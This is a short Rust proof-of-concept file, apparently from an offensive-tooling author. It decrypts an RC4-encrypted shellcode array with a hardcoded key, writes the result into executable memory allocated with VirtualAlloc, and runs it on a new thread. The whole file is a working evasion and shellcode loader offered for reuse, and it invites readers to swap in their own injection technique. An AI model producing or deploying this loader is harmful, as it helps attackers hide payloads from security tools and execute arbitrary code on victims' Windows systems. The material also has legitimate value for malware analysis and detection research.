
/*
    An POC of Rc4 Encryption Technique
    For More Codes: 
    @5mukx
*/

use rc4::{Rc4, KeyInit, StreamCipher};
use winapi::um::{errhandlingapi::GetLastError, handleapi::CloseHandle, memoryapi::VirtualAlloc, processthreadsapi::{CreateThread, ResumeThread}};
use std::ptr::{self, null_mut};
use winapi::um::synchapi::WaitForSingleObject;


macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[+] {}", format!($msg, $($arg), *));
    };
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[-] {}", format!($msg, $($arg), *));
        println!("Exiting ...");
        std::process::exit(1);
    };
}
fn main(){
    
    // Encrypted Shellcode here !
    let mut buf = [142, 107, 104, 1, 240, 64, 88, 236, 94, 35, 59, 43, 23, 163, 122, 216, 40, 91, 225, 163, 
    24, 202, 162, 245, 58, 83, 126, 124, 154, 221, 246, 138, 169, 156, 122, 229, 96, 197, 32,
     154, 184, 228, 37, 246, 97, 159, 100, 21, 176, 235, 208, 102, 118, 149, 129, 227, 214,
     113, 253, 12, 224, 23, 213, 164, 249, 147, 55, 113, 32, 10, 171, 55, 186, 43, 138, 206,
     223, 211, 9, 255, 24, 173, 56, 176, 4, 136, 170, 184, 17, 174, 194, 102, 43, 40, 209, 25,
     195, 9, 35, 255, 225, 61, 179, 248, 23, 172, 15, 75, 224, 142, 66, 206, 197, 159, 44, 132,
     35, 245, 119, 141, 255, 101, 67, 112, 70, 198, 144, 182, 154, 228, 167, 94, 87, 156, 165,
     219, 127, 76, 223, 204, 227, 199, 69, 231, 238, 213, 16, 250, 85, 219, 172, 51, 233, 217,
     191, 140, 80, 204, 70, 80, 182, 70, 45, 59, 79, 154, 5, 74, 119, 200, 145, 37, 21, 44, 205,
     55, 164, 149, 240, 250, 37, 37, 39, 78, 134, 8, 195, 216, 61, 199, 36, 1, 47, 29, 213, 168,
     237, 192, 250, 103, 48, 145, 233, 154, 242, 90, 71, 88, 148, 163, 61, 6, 123, 28, 255, 57,
     120, 56, 206, 208, 74, 36, 183, 190, 184, 95, 86, 76, 141, 151, 99, 59, 233, 47, 178, 249,
     18, 115, 253, 16, 212, 200, 95, 140, 121, 211, 167, 201, 140, 96, 245, 126, 230, 54, 220,
     38, 40, 24, 223, 42, 254, 233, 81, 16, 154, 51, 191, 205, 46, 90, 205, 172, 90, 56, 64, 11];

    // key => let key = b"This is nerdy .. im the key :)";
    let mut rc4 =  Rc4::new(b"This is nerdy .. im the key :)".into());
    rc4.apply_keystream(&mut buf);


    // => After this you can use you own Technique to inject the shellcode !
    unsafe{
        let vir_addr = VirtualAlloc(
            null_mut(),
            buf.len(),
            0x1000 | 0x2000,
            0x40,
        );

        if vir_addr.is_null(){
            error!("VirAlloc Error, Failed to allocate mem: {}",GetLastError());
        }
        okey!("Allocated Address: {:?}",vir_addr);

        ptr::copy(buf.as_ptr(), vir_addr as *mut u8, buf.len());

        let h_thread = CreateThread(
            null_mut(),
            0,
            std::mem::transmute(vir_addr),
            null_mut(),
            0x00000004, // CREATE_SUSPEND
            null_mut(),
        );

        if h_thread.is_null(){
            error!("Failed to create Thread :{:?}",GetLastError());
        }

        okey!("Execution addr: {:?}",h_thread);

        ResumeThread(h_thread);
        okey!("Executed Shellcode ...{}","!");

        WaitForSingleObject(h_thread, 0xFFFFFFFF);
        CloseHandle(h_thread);
    }
}

